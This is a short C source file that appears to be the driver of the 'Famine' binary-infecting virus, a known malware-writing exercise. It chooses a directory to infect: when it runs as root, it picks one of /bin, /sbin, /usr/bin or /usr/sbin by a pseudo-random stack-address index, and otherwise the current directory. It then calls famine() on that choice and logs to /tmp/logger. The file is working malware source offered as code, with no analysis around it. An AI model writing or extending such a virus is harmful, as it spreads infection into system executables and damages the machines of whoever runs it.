#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

static inline unsigned int get_random_index(void)
{
	const unsigned long seed = 0;

	return ((long)(&seed) >> 8) % 4;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void entry(void)
{
	unsigned int index = 4;
	struct directory infect[] =
	{
		(struct directory){"/bin/", "", 5},
		(struct directory){"/sbin/","", 6},
		(struct directory){"/usr/bin/", "", 9},
		(struct directory){"/usr/sbin/", "", 10},
		(struct directory){"./", "", 2},
	};

	if (getuid() == 0)
		index = get_random_index();
	
	famine(&infect[index]);
}

////////////////////////////////////////////////////////////////////////////////
/// BOOTSTRAP FUNCTION
////////////////////////////////////////////////////////////////////////////////

int main(void)
{
	g_fd = open("/tmp/logger", O_CREAT | O_WRONLY | O_APPEND, 0644);
	dprintf(g_fd, "\n");
	entry();
	close(g_fd);

	return 0;
}
